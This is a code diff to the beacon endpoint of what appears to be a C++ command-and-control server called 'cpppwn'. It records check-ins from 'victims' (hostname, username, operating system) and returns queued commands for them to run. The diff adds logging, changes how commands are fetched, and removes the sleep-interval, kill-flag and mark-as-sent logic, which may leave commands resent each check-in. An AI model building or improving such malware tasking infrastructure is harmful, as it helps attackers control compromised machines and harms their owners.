@@ -31,6 +31,8 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
                 return error_response(400, "Invalid beacon format");
             }
 
+            std::println("Client: {} is checking in...", beacon.victim_uid);
+
             // 1. Determine External IP from the socket if "auto" was sent
             std::string effective_ip = beacon.external_ip;
             if (effective_ip == "auto" || effective_ip == "1.1.1.1") {
@@ -48,10 +50,10 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
             v_data.hostname = beacon.hostname;
             v_data.username = beacon.username;
             v_data.operating_system = beacon.operating_system;
-            v_data.last_update = get_unix_time(); // Using our custom function
+            v_data.last_update = get_unix_time();
             v_data.status = 1; // Online
 
-            if (existing) {
+            if (existing.has_value()) {
                 victims.update(existing->id, v_data);
             } else {
                 victims.create(v_data);
@@ -73,29 +75,11 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
             }
 
             // 4. Fetch Pending Commands (status 0)
-            auto pending = commands.find([&](const CommandDAO& cmd) {
-                return cmd.client == beacon.victim_uid && cmd.status == 0;
-            });
+            auto command_list = commands.get_repo()->get_for_client(beacon.victim_uid);
 
-            // 5. Prepare Response
-            BeaconResponse response;
-            response.commands = pending;
-            response.should_exit = (v_data.status == 2); // 2 = Tasked to kill
+            std::println("Amount of commands #{}", command_list.size());
 
-            // Adaptive Sleep Logic
-            if (not pending.empty()) {
-                response.beacon_interval = (pending.size() > 5) ? 10 : 30;
-            } else {
-                response.beacon_interval = 120; // Default idle sleep
-            }
-
-            // Update commands to "Sent" (status 1) so they aren't sent twice
-            for (auto& cmd : pending) {
-                cmd.status = 1;
-                commands.update(cmd.id, cmd);
-            }
-
-            return HttpResponse().set_json(glz::write_json(response).value_or("{}"));
+            return HttpResponse().set_json(glz::write_json(command_list).value_or("{}"));
 
         } catch (const std::exception& e) {
             return error_response(500, "Internal Server Error");
